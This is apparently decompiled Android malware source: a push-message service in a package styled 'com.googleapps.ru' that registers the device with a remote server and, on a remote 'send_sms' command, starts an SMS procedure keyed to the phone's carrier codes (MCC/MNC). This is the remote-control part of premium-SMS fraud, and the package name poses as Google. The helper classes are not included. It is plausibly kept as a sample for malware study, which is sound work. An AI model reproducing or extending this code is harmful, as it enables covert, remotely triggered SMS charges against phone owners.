package com.googleapps.ru;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import com.google.android.gcm.GCMBaseIntentService;

public class GCMIntentService
  extends GCMBaseIntentService
{
  private static final String TAG = "GCMIntentService";
  
  public GCMIntentService()
  {
    super(new String[] { "360470374643" });
  }
  
  protected void onDeletedMessages(Context paramContext, int paramInt)
  {
    Log.i("GCMIntentService", "Received deleted messages notification");
  }
  
  public void onError(Context paramContext, String paramString)
  {
    Log.i("GCMIntentService", "Received error: " + paramString);
  }
  
  protected void onMessage(Context paramContext, Intent paramIntent)
  {
    if (paramIntent.getExtras().getString("command").equals("send_sms"))
    {
      ProcedureStarter.startProcedure(paramContext, Utils.getMCC(paramContext), Utils.getMNC(paramContext));
      return;
    }
    Log.d("DEBUGGING", "UNKNOWN COMMAND");
  }
  
  protected boolean onRecoverableError(Context paramContext, String paramString)
  {
    Log.i("GCMIntentService", "Received recoverable error: " + paramString);
    return super.onRecoverableError(paramContext, paramString);
  }
  
  protected void onRegistered(Context paramContext, String paramString)
  {
    Log.i("GCMIntentService", "Device registered");
    DeviceRegistrar.registerToServer(paramContext, paramString);
  }
  
  protected void onUnregistered(Context paramContext, String paramString)
  {
    Log.i("GCMIntentService", "Device unregistered");
    DeviceRegistrar.unregisterToServer(paramContext, paramString);
  }
}
